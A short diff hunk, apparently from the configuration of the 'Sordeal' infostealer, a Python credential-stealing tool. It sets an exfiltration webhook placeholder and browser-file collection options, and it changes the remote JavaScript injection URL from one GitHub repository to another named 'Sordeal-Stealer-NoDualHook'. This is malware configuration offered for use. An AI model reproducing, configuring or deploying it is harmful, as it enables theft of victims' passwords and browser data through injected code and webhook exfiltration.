@@ -45,7 +45,7 @@ NotPSSW = []
 __config__ = {
     # Basic Options
     "SO_webhook": "%WEBHOOK_HERE%",
-    "SO_injection_url": "https://raw.githubusercontent.com/SOrdeal/Sordeal-Injection/main/index.js",
+    "SO_injection_url": "https://raw.githubusercontent.com/Inplex-sys/Sordeal-Stealer-NoDualHook/main/inject.js",
 
     # Files Options
     "SO_getbrowsersfiles": "%_browsers_files%",
